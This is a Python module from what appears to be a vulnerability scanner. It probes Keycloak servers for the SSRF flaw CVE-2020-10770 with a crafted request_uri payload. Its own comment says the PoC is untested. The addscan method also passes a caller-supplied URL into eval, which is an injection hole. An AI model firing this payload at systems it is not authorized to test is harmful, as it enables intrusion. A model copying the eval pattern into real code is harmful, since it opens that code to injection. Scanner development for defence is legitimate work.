#!/usr/bin/env python3
# -*- coding:utf-8 -*-

''' 该POC没有经过实际环境验证(暂未找到漏洞环境, 还没测试POC准确性)

    Keycloak扫描类: 
        Keycloak SSRF
            CVE-2020-10770
                Payload: Awvs scanner
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.Keycloak.cve_2020_10770 import cve_2020_10770_scan

class Keycloak():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Keycloak'
        self.md = md5(self.app_name)

        self.cve_2020_10770_payloads = [
            {
                'path': 'auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=dnsdomain',
                'data': ''
            }
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_10770_scan, url=url)
        ]

Keycloak.cve_2020_10770_scan = cve_2020_10770_scan

keycloak = Keycloak()